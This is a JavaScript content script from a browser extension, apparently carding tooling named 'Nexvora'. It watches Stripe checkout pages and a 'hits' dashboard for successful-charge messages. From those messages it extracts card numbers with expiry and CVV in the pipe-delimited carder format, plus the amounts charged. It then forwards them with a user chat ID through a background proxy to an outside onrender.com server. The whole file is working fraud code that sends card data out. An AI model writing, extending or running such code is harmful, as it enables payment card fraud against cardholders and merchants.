/**
 * Nexvora Notification System v2.0
 * Monitors both the Dashboard and Checkout Pages for successful hits.
 */

(function() {
    const RENDER_URL = 'https://extensionshitteer.onrender.com';
    let userChatId = 'Unknown';
    let hasNotifiedSuccess = false; // Anti-duplicate flag for current page session

    // Get User Chat ID from storage
    chrome.storage.local.get(['chatId'], (result) => {
        if (result.chatId) {
            userChatId = result.chatId;
        }
    });

    const notifyServer = async (hitData) => {
        if (hasNotifiedSuccess) return; 
        
        try {
            hasNotifiedSuccess = true;
            
            // Get the REAL site name (top level) instead of checkout.stripe.com
            let siteName = window.location.hostname;
            try {
                // If we are in an iframe, use the referrer as the source site
                if (window.top !== window.self && document.referrer) {
                    siteName = new URL(document.referrer).hostname;
                }
            } catch (e) {
                console.warn('Could not determine top-level site:', e.message);
            }

            console.info('🚀 Nexvora: Requesting background proxy for hit...', hitData);

            chrome.runtime.sendMessage({
                type: 'NOTIFY_HIT',
                data: {
                    card: hitData.card,
                    amount: hitData.amount,
                    gateway: hitData.gateway,
                    status: hitData.status,
                    user_chat_id: userChatId,
                    site_name: siteName
                }
            }, (response) => {
                console.log('Background Proxy status:', response);
            });
        } catch (error) {
            console.error('Failed to send notification:', error);
            hasNotifiedSuccess = false; 
        }
    };

    const processNewNode = (node) => {
        const text = node.innerText || node.textContent || '';
        if (!text || text.length < 5) return;

        const lowerText = text.toLowerCase();
        
        // 1. Check for SUCCESS keywords (BROADER LIST)
        const successKeywords = ['paid successfully', 'successfully hitted', 'approved', 'success', 'successfully'];
        const isSuccess = successKeywords.some(kw => lowerText.includes(kw));

        // 2. Check for IGNORE keywords
        const ignoreKeywords = ['processing', 'loading', 'wait', 'please', 'checking'];
        const shouldIgnore = ignoreKeywords.some(kw => lowerText.includes(kw));
        
        // 3. PRIORITY: If it is a success, DO NOT ignore it!
        if (isSuccess) {
            console.info('🚀 Nexvora: Final Success hit detected!', text);
            
            // Extract CARD (Format: XXXX|XX|XX|XXXX)
            const cardMatch = text.match(/\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}/);
            const card = cardMatch ? cardMatch[0] : 'N/A';

            // Extract CLEAN AMOUNT (Format: $XX.XX)
            const amountMatch = text.match(/\$\d+(\.\d{2})?/);
            const amount = amountMatch ? amountMatch[0] : (document.body.innerText.match(/\$\d+(\.\d{2})?/) || ['N/A'])[0];
            
            const hitData = {
                card: card,
                amount: amount,
                gateway: 'Stripe',
                status: 'Approved'
            };

            notifyServer(hitData);
        }
    };

    const setupObserver = () => {
        // Mode 1: Dashboard Monitoring (Specific containers)
        const dashboardContainers = [
            'recentHitsWrap',
            'hitsWrap'
        ].map(id => document.getElementById(id)).filter(el => !!el);

        if (dashboardContainers.length > 0) {
            dashboardContainers.forEach(container => {
                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        mutation.addedNodes.forEach((node) => {
                            if (node.nodeType === 1) processNewNode(node);
                        });
                    });
                });
                observer.observe(container, { childList: true, subtree: true });
                console.log(`✅ Nexvora: Monitoring Dashboard (${container.id})...`);
            });
        }

        // Mode 2: Global Page Monitoring (For checkout popups/toasts)
        const globalObserver = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) processNewNode(node);
                });
            });
        });

        globalObserver.observe(document.body, { childList: true, subtree: true });
        console.log('🌍 Nexvora: Global Monitoring Active (Checkout Pages).');
    };

    // Initialize
    console.log('🔥 Nexvora Notification System initialized.');
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', setupObserver);
    } else {
        setupObserver();
    }
})();
